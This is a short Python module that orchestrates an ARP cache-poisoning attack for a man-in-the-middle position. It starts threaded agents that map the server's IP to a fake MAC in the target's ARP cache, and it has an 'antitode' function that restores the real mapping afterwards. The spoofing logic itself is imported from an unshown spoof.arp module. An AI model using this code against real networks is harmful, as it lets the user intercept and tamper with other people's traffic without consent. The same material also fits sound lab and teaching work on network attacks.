import logging
from spoof.arp import *

agents=[]

def begin_poisoning( configs ):
	# targets is an array of IP to poison, or 1 target
	targets = []
	targets.append( configs['target']['ip'] )

	# poison multiple targets with same poison
	server_ip= configs['server']['ip']
	fake_mac = configs['mitm']['mac']

	for target in targets: # init a thread for each target to poison
		arp = arp_agent( 1, target, server_ip, fake_mac )
		arp.setDaemon(True)
		arp.start( )
		agents.append( arp )

	return

def antitode( configs ):
	# targets is an array of IP to poison, or 1 target
	targets = []
	targets.append( configs['target']['ip'] )

	# poison multiple targets with same poison
	server_ip= configs['server']['ip']
	real_mac = configs['server']['mac']

	for agent in agents:
		agent.stop()

	for target in targets:
		arp = arp_agent( 0, target, server_ip, real_mac )
		arp.setDaemon ( True )
		arp.start( )
		arp.join()
	return


